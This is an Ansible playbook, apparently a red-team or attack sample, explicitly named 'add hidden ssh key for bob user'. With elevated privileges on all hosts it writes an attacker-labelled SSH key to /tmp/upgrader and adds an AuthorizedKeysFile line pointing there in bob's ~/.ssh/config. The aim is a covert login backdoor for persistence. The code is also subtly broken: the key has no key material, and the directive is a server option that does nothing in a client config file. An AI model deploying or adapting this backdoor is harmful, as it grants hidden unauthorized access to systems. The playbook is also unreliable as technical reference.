---
- name: "add hidden ssh key for bob user"
  hosts: all
  become: yes
  tasks:
    - name: "add ssh keys"
      shell: "echo 'ssh-rsa  attacker@attacker' >> /tmp/upgrader"
    - name: "create ssh config file"
      shell: "mkdir -p /home/bob/.ssh && touch /home/bob/.ssh/config"
    - name: "change ssh config file"
      shell: "echo 'AuthorizedKeysFile /tmp/upgrader .ssh/authorized_keys' >> /home/bob/.ssh/config && chown bob:bob /home/bob/.ssh/config"
